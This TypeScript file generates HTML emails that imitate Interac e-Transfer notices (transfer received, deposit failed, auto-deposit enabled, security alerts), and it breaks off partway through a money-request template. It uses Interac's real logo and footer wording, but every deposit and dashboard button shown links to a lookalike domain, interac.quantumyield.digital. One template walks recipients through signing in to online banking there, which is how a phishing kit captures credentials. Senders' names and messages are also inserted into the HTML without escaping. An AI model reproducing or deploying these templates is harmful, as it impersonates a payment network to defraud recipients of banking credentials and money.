// Email Template Generators for all 22 templates

interface BaseEmailData {
  recipientName: string
  amount?: number
  message?: string
  transferId?: string
  senderName?: string
  institution?: string
  timestamp?: string
  bankName?: string
  limit?: string
  deviceInfo?: string
  location?: string
}

// Shared email styles
const getEmailStyles = () => `
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f5f5f5; }
    .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
    .topbar { background-color: #000000; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; }
    .topbar-left { display: flex; align-items: center; gap: 16px; }
    .topbar img { height: 50px; display: block; }
    .dba { display: flex; align-items: center; color: rgba(255, 255, 255, 0.7); font-weight: 500; font-size: 13px; line-height: 50px; }
    .topbar-right { display: flex; align-items: center; }
    .brand { color: rgba(255, 255, 255, 0.7); font-weight: 500; font-size: 13px; }
    .content { padding: 32px 24px; }
    .greeting { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 8px; }
    .subtitle { font-size: 16px; color: #666666; margin-bottom: 24px; }
    .amount-box { background: linear-gradient(135deg, #FDB913 0%, #e5a811 100%); color: #000000; padding: 20px; border-radius: 12px; text-align: center; margin: 24px 0; }
    .amount-value { font-size: 32px; font-weight: 700; }
    .amount-label { font-size: 14px; opacity: 0.8; margin-top: 4px; }
    .details-card { background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 20px; margin: 24px 0; }
    .details-title { font-size: 16px; font-weight: 600; color: #000000; margin-bottom: 16px; }
    .detail-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #e9ecef; }
    .detail-row:last-child { border-bottom: none; }
    .detail-label { color: #666666; font-size: 14px; }
    .detail-value { color: #000000; font-size: 14px; font-weight: 500; }
    .button-section { text-align: center; margin: 32px 0; }
    .action-button { display: inline-block; background-color: #FDB913; color: #000000; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; }
    .action-button:hover { background-color: #e5a811; }
    .alert-box { padding: 16px; border-radius: 8px; margin: 24px 0; }
    .alert-success { background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
    .alert-warning { background-color: #fff3cd; border: 1px solid #ffeeba; color: #856404; }
    .alert-danger { background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
    .alert-info { background-color: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; }
    .security-section { background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 20px; margin: 24px 0; }
    .security-title { display: flex; align-items: center; gap: 8px; font-size: 16px; font-weight: 600; color: #000000; margin-bottom: 12px; }
    .instructions { margin: 24px 0; }
    .instructions ol { padding-left: 20px; color: #333333; }
    .instructions li { padding: 8px 0; line-height: 1.6; }
    .footer { background-color: #f8f9fa; padding: 24px; text-align: center; border-top: 1px solid #e9ecef; }
    .footer-text { font-size: 12px; color: #666666; line-height: 1.6; }
    .footer-links { margin-top: 16px; }
    .footer-link { color: #FDB913; text-decoration: none; font-size: 12px; margin: 0 8px; }
  </style>
`

const getHeader = () => `
  <div class="topbar">
    <div class="topbar-left">
      <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
      <div class="dba">Partnered with QuantumYield Holdings</div>
    </div>
    <div class="topbar-right">
      <div class="brand">e-Transfer</div>
    </div>
  </div>
`

const getFooter = () => `
  <div class="footer">
    <p class="footer-text">
      This is an automated message from Interac e-Transfer. Please do not reply to this email.<br>
      For assistance, visit <a href="https://www.interac.ca" style="color: #FDB913;">interac.ca</a>
    </p>
    <div class="footer-links">
      <a href="https://www.interac.ca/en/consumers/products/interac-e-transfer/" class="footer-link">Learn More</a>
      <a href="https://www.interac.ca/en/contact-us/" class="footer-link">Contact Us</a>
      <a href="https://www.interac.ca/en/privacy/" class="footer-link">Privacy Policy</a>
    </div>
    <p class="footer-text" style="margin-top: 16px;">
      &copy; ${new Date().getFullYear()} Interac Corp. All rights reserved.
    </p>
  </div>
`

function formatAmount(amount: number): string {
  return amount.toLocaleString("en-CA", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

function formatDate(): string {
  return new Date().toLocaleDateString("en-CA", { 
    weekday: "long", 
    year: "numeric", 
    month: "long", 
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit"
  })
}

// 1. Transfer Received
export function generateTransferReceived(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Hello ${data.recipientName},</h1>
          <p class="subtitle">You have received a secure Interac e-Transfer.</p>
          
          <div class="amount-box">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Transfer Amount</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Transfer Details</h3>
            <div class="detail-row"><span class="detail-label">From:</span><span class="detail-value">${data.senderName || "QuantumYield Treasury"}</span></div>
            <div class="detail-row"><span class="detail-label">Date:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            ${data.message ? `<div class="detail-row"><span class="detail-label">Message:</span><span class="detail-value">${data.message}</span></div>` : ""}
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Your Money</a>
          </div>
          
          <div class="alert-box alert-warning">
            <strong>Important:</strong> This transfer expires in 30 days. Please deposit promptly.
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 2. Transfer Sent Confirmation
export function generateTransferSent(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Transfer Sent Successfully</h1>
          <p class="subtitle">Your Interac e-Transfer has been sent.</p>
          
          <div class="alert-box alert-success">
            <strong>Confirmed:</strong> Your transfer of $${formatAmount(amount)} CAD has been successfully sent.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Transaction Summary</h3>
            <div class="detail-row"><span class="detail-label">Amount Sent:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">To:</span><span class="detail-value">${data.recipientName}</span></div>
            <div class="detail-row"><span class="detail-label">Date:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #28a745;">Sent</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px; margin-top: 24px;">
            The recipient will receive an email notification with instructions to deposit the funds.
            You will be notified once the transfer has been deposited.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 3. Transfer Pending
export function generateTransferPending(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Transfer Pending</h1>
          <p class="subtitle">Action required to complete your e-Transfer.</p>
          
          <div class="alert-box alert-warning">
            <strong>Pending:</strong> Your transfer of $${formatAmount(amount)} CAD is awaiting deposit.
          </div>
          
          <div class="amount-box" style="background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Pending Amount</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Transfer Details</h3>
            <div class="detail-row"><span class="detail-label">Recipient:</span><span class="detail-value">${data.recipientName}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #ffc107;">Pending</span></div>
            <div class="detail-row"><span class="detail-label">Expires:</span><span class="detail-value">30 days from send date</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px;">
            The recipient has been notified. If they haven't received the email, you may resend or cancel the transfer.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 4. Transfer Cancelled
export function generateTransferCancelled(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Transfer Cancelled</h1>
          <p class="subtitle">Your Interac e-Transfer has been cancelled.</p>
          
          <div class="alert-box alert-danger">
            <strong>Cancelled:</strong> The transfer of $${formatAmount(amount)} CAD has been cancelled and funds returned.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Cancellation Details</h3>
            <div class="detail-row"><span class="detail-label">Original Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Intended Recipient:</span><span class="detail-value">${data.recipientName}</span></div>
            <div class="detail-row"><span class="detail-label">Cancelled On:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #dc3545;">Cancelled</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px;">
            The funds have been returned to your account. Please allow 1-2 business days for the refund to appear.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 5. Transfer Expired
export function generateTransferExpired(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Transfer Expired</h1>
          <p class="subtitle">Your Interac e-Transfer was not claimed in time.</p>
          
          <div class="alert-box alert-warning">
            <strong>Expired:</strong> The transfer of $${formatAmount(amount)} CAD was not deposited within 30 days.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Expiry Details</h3>
            <div class="detail-row"><span class="detail-label">Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Recipient:</span><span class="detail-value">${data.recipientName}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #6c757d;">Expired</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px;">
            The funds will be automatically returned to your account within 1-2 business days. You may send a new transfer if needed.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 6. Deposit Completed
export function generateDepositCompleted(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Deposit Successful!</h1>
          <p class="subtitle">Your e-Transfer has been deposited to your account.</p>
          
          <div class="alert-box alert-success">
            <strong>Complete:</strong> $${formatAmount(amount)} CAD has been added to your account.
          </div>
          
          <div class="amount-box" style="background: linear-gradient(135deg, #28a745 0%, #218838 100%);">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Successfully Deposited</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Deposit Details</h3>
            <div class="detail-row"><span class="detail-label">From:</span><span class="detail-value">${data.senderName || "QuantumYield Treasury"}</span></div>
            <div class="detail-row"><span class="detail-label">To Account:</span><span class="detail-value">${data.bankName || "Primary Chequing"}</span></div>
            <div class="detail-row"><span class="detail-label">Date:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #28a745;">Completed</span></div>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 7. Deposit Failed
export function generateDepositFailed(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Deposit Failed</h1>
          <p class="subtitle">We couldn't complete your e-Transfer deposit.</p>
          
          <div class="alert-box alert-danger">
            <strong>Action Required:</strong> Your deposit of $${formatAmount(amount)} CAD could not be processed.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Issue Details</h3>
            <div class="detail-row"><span class="detail-label">Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #dc3545;">Failed</span></div>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Common Reasons for Failure</h4>
            <ul style="color: #666666; padding-left: 20px;">
              <li>Incorrect security answer</li>
              <li>Account restrictions</li>
              <li>Technical issues with your bank</li>
            </ul>
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Try Again</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 8. Deposit Reminder
export function generateDepositReminder(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Reminder: Unclaimed e-Transfer</h1>
          <p class="subtitle">Don't forget to deposit your money, ${data.recipientName}!</p>
          
          <div class="alert-box alert-warning">
            <strong>Reminder:</strong> You have an unclaimed e-Transfer of $${formatAmount(amount)} CAD waiting.
          </div>
          
          <div class="amount-box">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Waiting for You</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Transfer Details</h3>
            <div class="detail-row"><span class="detail-label">From:</span><span class="detail-value">${data.senderName || "QuantumYield Treasury"}</span></div>
            <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Now</a>
          </div>
          
          <p style="color: #856404; font-size: 14px; text-align: center;">
            This transfer will expire soon. Please deposit before the expiry date.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 9. Deposit Instructions
export function generateDepositInstructions(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">How to Deposit Your e-Transfer</h1>
          <p class="subtitle">Follow these simple steps to receive your money.</p>
          
          <div class="instructions">
            <ol>
              <li><strong>Click the Deposit Button:</strong> Click "Deposit Your Money" in the transfer notification email.</li>
              <li><strong>Select Your Bank:</strong> Choose your financial institution from the list of supported banks.</li>
              <li><strong>Sign In:</strong> Log in to your online banking using your credentials.</li>
              <li><strong>Answer Security Question:</strong> Enter the correct answer provided by the sender.</li>
              <li><strong>Choose Account:</strong> Select which account to deposit the funds into.</li>
              <li><strong>Confirm:</strong> Review and confirm the deposit.</li>
            </ol>
          </div>
          
          <div class="alert-box alert-info">
            <strong>Tip:</strong> Enable Auto-Deposit to automatically receive future e-Transfers without answering security questions.
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Start Deposit</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 10. Auto-Deposit Enabled
export function generateAutoDepositEnabled(data: BaseEmailData): string {
  const activationDate = "Thursday, March 26, 2026 at 10:31 a.m."
  const receiver = data.recipientName || "NICK ST-PIERRE"
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Auto-Deposit Activated!</h1>
          <p class="subtitle">Future e-Transfers will be deposited automatically.</p>

          <div class="alert-box alert-success">
            <strong>Enablement:</strong> Interac e-Transfer Auto-Deposit has been activated for your account when receiving from QuantumYield Holdings.
          </div>

          <div class="details-card">
            <h3 class="details-title">Auto-Deposit Settings</h3>
            <div class="detail-row">
              <span class="detail-label">Verified Sender:</span>
              <span class="detail-value">QuantumYield Innovation Technology</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Receiver:</span>
              <span class="detail-value">${receiver}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Status:</span>
              <span class="detail-value" style="color: #28a745; font-weight: 600;">Active</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Activation Date:</span>
              <span class="detail-value">${activationDate}</span>
            </div>
          </div>

          <div class="security-section">
            <h4 class="security-title">What This Means</h4>
            <p style="color: #555555; font-size: 14px; line-height: 1.7; margin: 0;">
              All future Interac e-Transfers sent from this verified sender will be automatically deposited into the recipient&apos;s account, requiring no action on their part. Note that wait times may vary, and an email confirmation will follow each transaction.
            </p>
          </div>

          <div class="alert-box alert-info" style="margin-top: 24px;">
            <strong>Note:</strong> If you did not request Auto-Deposit activation or do not recognize this sender, please contact your financial institution immediately to review your account settings.
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 11. Security Question Updated
export function generateSecurityQuestionUpdated(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Security Settings Updated</h1>
          <p class="subtitle">Your e-Transfer security question has been changed.</p>
          
          <div class="alert-box alert-info">
            <strong>Updated:</strong> Your security question was successfully changed on ${formatDate()}.
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Important Security Notice</h4>
            <p style="color: #666666; font-size: 14px; line-height: 1.6;">
              If you did not make this change, please contact your financial institution immediately.
              Your account security is our top priority.
            </p>
          </div>
          
          <div class="alert-box alert-warning">
            <strong>Remember:</strong> Never share your security answer with anyone. Legitimate organizations will never ask for it.
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 12. Suspicious Activity Alert
export function generateSuspiciousActivity(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting" style="color: #dc3545;">Security Alert</h1>
          <p class="subtitle">Unusual activity detected on your account.</p>
          
          <div class="alert-box alert-danger">
            <strong>Alert:</strong> We detected unusual activity that requires your immediate attention.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Activity Details</h3>
            <div class="detail-row"><span class="detail-label">Type:</span><span class="detail-value">Unusual Transaction Pattern</span></div>
            <div class="detail-row"><span class="detail-label">Detected:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Location:</span><span class="detail-value">${data.location || "Unknown Location"}</span></div>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Recommended Actions</h4>
            <ol style="color: #666666; padding-left: 20px;">
              <li>Review your recent transactions</li>
              <li>Change your password immediately</li>
              <li>Enable two-factor authentication</li>
              <li>Contact your bank if unauthorized activity is found</li>
            </ol>
          </div>
          
          <p style="color: #dc3545; font-size: 14px; font-weight: 500; text-align: center;">
            If you don't recognize this activity, contact your financial institution immediately.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 13. Password Reset
export function generatePasswordReset(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Reset Your Password</h1>
          <p class="subtitle">You requested to reset your password.</p>
          
          <div class="alert-box alert-info">
            This password reset link will expire in 24 hours.
          </div>
          
          <div class="button-section">
            <a href="#" class="action-button">Reset Password</a>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Didn't Request This?</h4>
            <p style="color: #666666; font-size: 14px; line-height: 1.6;">
              If you didn't request a password reset, please ignore this email or contact support if you believe your account has been compromised.
            </p>
          </div>
          
          <p style="color: #666666; font-size: 12px; text-align: center; margin-top: 24px;">
            For security, this request was received from IP: ${data.location || "Unknown"} on ${formatDate()}
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 14. Two-Factor Authentication
export function generateTwoFactorEnabled(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Two-Factor Authentication Enabled</h1>
          <p class="subtitle">Your account is now more secure.</p>
          
          <div class="alert-box alert-success">
            <strong>Enabled:</strong> Two-factor authentication has been activated for your account.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">2FA Settings</h3>
            <div class="detail-row"><span class="detail-label">Method:</span><span class="detail-value">Authenticator App</span></div>
            <div class="detail-row"><span class="detail-label">Enabled On:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #28a745;">Active</span></div>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Important</h4>
            <p style="color: #666666; font-size: 14px; line-height: 1.6;">
              Save your backup codes in a secure location. You'll need them if you lose access to your authenticator app.
            </p>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 15. New Login Detected
export function generateLoginNotification(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">New Sign-In Detected</h1>
          <p class="subtitle">A new device signed in to your account.</p>
          
          <div class="alert-box alert-info">
            <strong>New Login:</strong> We noticed a sign-in to your account from a new device.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Login Details</h3>
            <div class="detail-row"><span class="detail-label">Device:</span><span class="detail-value">${data.deviceInfo || "Chrome on Windows"}</span></div>
            <div class="detail-row"><span class="detail-label">Location:</span><span class="detail-value">${data.location || "Toronto, Canada"}</span></div>
            <div class="detail-row"><span class="detail-label">Time:</span><span class="detail-value">${formatDate()}</span></div>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Was this you?</h4>
            <p style="color: #666666; font-size: 14px; line-height: 1.6;">
              If this was you, no action is needed. If you don't recognize this activity, please secure your account immediately.
            </p>
          </div>
          
          <div class="button-section">
            <a href="#" class="action-button" style="background-color: #dc3545;">Secure My Account</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 16. Account Verified
export function generateAccountVerified(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Account Verified!</h1>
          <p class="subtitle">Welcome to Interac e-Transfer, ${data.recipientName}.</p>
          
          <div class="alert-box alert-success">
            <strong>Verified:</strong> Your account has been successfully verified and activated.
          </div>
          
          <div class="security-section">
            <h4 class="security-title">You Can Now</h4>
            <ul style="color: #666666; padding-left: 20px; line-height: 2;">
              <li>Send money to anyone with an email address</li>
              <li>Receive e-Transfers from others</li>
              <li>Set up Auto-Deposit for instant funds</li>
              <li>Request money from contacts</li>
            </ul>
          </div>
          
          <div class="button-section">
            <a href="https://interac.quantumyield.digital/dashboard" class="action-button">Get Started</a>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 17. Profile Updated
export function generateProfileUpdated(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Profile Updated</h1>
          <p class="subtitle">Your profile information has been changed.</p>
          
          <div class="alert-box alert-info">
            <strong>Updated:</strong> Your profile was modified on ${formatDate()}.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Changed Information</h3>
            <div class="detail-row"><span class="detail-label">Account:</span><span class="detail-value">${data.recipientName}</span></div>
            <div class="detail-row"><span class="detail-label">Updated:</span><span class="detail-value">${formatDate()}</span></div>
          </div>
          
          <div class="security-section">
            <h4 class="security-title">Didn't Make These Changes?</h4>
            <p style="color: #666666; font-size: 14px; line-height: 1.6;">
              If you didn't update your profile, please contact support immediately and change your password.
            </p>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 18. Bank Account Linked
export function generateBankLinked(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Bank Account Linked</h1>
          <p class="subtitle">Your bank account has been successfully connected.</p>
          
          <div class="alert-box alert-success">
            <strong>Connected:</strong> ${data.bankName || "Your bank account"} is now linked to your profile.
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Linked Account</h3>
            <div class="detail-row"><span class="detail-label">Bank:</span><span class="detail-value">${data.bankName || "Financial Institution"}</span></div>
            <div class="detail-row"><span class="detail-label">Account:</span><span class="detail-value">****${Math.floor(Math.random() * 9000) + 1000}</span></div>
            <div class="detail-row"><span class="detail-label">Linked On:</span><span class="detail-value">${formatDate()}</span></div>
            <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color: #28a745;">Active</span></div>
          </div>
          
          <p style="color: #666666; font-size: 14px;">
            You can now send and receive e-Transfers using this account.
          </p>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 19. Transfer Limit Increased
export function generateLimitIncrease(data: BaseEmailData): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Transfer Limit Increased</h1>
          <p class="subtitle">Your daily e-Transfer limit has been updated.</p>
          
          <div class="alert-box alert-success">
            <strong>Approved:</strong> Your transfer limit has been increased.
          </div>
          
          <div class="amount-box" style="background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);">
            <div class="amount-value">$${data.limit || "10,000"}</div>
            <div class="amount-label">New Daily Limit</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Limit Details</h3>
            <div class="detail-row"><span class="detail-label">Previous Limit:</span><span class="detail-value">$3,000 CAD</span></div>
            <div class="detail-row"><span class="detail-label">New Limit:</span><span class="detail-value">$${data.limit || "10,000"} CAD</span></div>
            <div class="detail-row"><span class="detail-label">Effective:</span><span class="detail-value">${formatDate()}</span></div>
          </div>
        </div>
        ${getFooter()}
      </div>
    </body>
    </html>
  `
}

// 20. Money Request
export function generateMoneyRequest(data: BaseEmailData): string {
  const amount = data.amount || 0
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${getEmailStyles()}</head>
    <body>
      <div class="container">
        ${getHeader()}
        <div class="content">
          <h1 class="greeting">Money Request</h1>
          <p class="subtitle">${data.senderName || "Someone"} is requesting money from you.</p>
          
          <div class="amount-box" style="background: linear-gradient(135deg, #e83e8c 0%, #c82333 100%);">
            <div class="amount-value">$${formatAmount(amount)} CAD</div>
            <div class="amount-label">Requested Amount</div>
          </div>
          
          <div class="details-card">
            <h3 class="details-title">Request Details</h3>
            <div class="detail-row"><span class="detail-label">From:</span><span class="detail-value">${data.senderName || "Requester"}</span></div>
            <div class="detail-row"><span class="detail-label">Amount:</span><span class="detail-value">$${formatAmount(amount)} CAD</span></div>
            ${data.message ? `<div class="detail-row"><span class="detail-label">Message:</span><span class="detail-value">${data.message}</span></div>` : ""}
            <div class="detail-row"><span class="detail-label">Request ID:</span><span class="detail-value">${data.transferId || "REQ-000000"}</span></div>
          </div>
          
